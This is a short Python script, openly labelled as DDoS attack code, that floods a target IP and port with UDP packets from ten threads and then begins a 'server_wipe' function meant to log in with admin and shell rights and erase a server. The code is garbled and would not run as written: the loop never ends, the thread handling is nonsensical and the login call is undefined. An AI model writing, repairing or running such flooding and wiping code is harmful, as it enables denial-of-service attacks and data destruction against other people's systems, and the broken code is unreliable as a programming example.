# now let's write DDOS attack code in python 
import socket
import threading 

def ddos_attack(target_ip: str, target_port: int, duration: int) -> None:
    """Performs a simple DDOS attack by sending UDP packets to the target IP and port for a specified duaration."""
    while duration > 0:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(b"DDOS ATTACK", (target_ip, target_port))
            print(f"Sent packet to {target_ip}:{target_port}")
        except Exception as e:
            print(f"an error occurred: {e}")

# now we will run the ddos attack in multiple threads
if __name__ == "__main__":
    target_ip = "" # specify the target ip address 
    target_port = 80 # specify the target port
    duration = 60 # duration of the attack in seconds 
    threads = []
    for _ in range(10): # create 10 threads for the attack
        thread = threading.Thread(target=ddos_attack, args=(target_ip, target_port, duration))
        threads.append(threads)
        threads.__setattr__("start" \
        "")
        for thread in threads:
            thread.join()
            print("DDOS attack completed.")
        
# now we need to wipe everything inside 

def server_wipe(server):
    admin = True   # in here we are letting the computer , we have the full permission to take admin rights also telling it we have to perform some shell events in the meanwhile ..
    shell = True
    check = True 
    Port = 80
    server_IP_Address = ""
    sending = server.login("", admin, shell, check)
    



    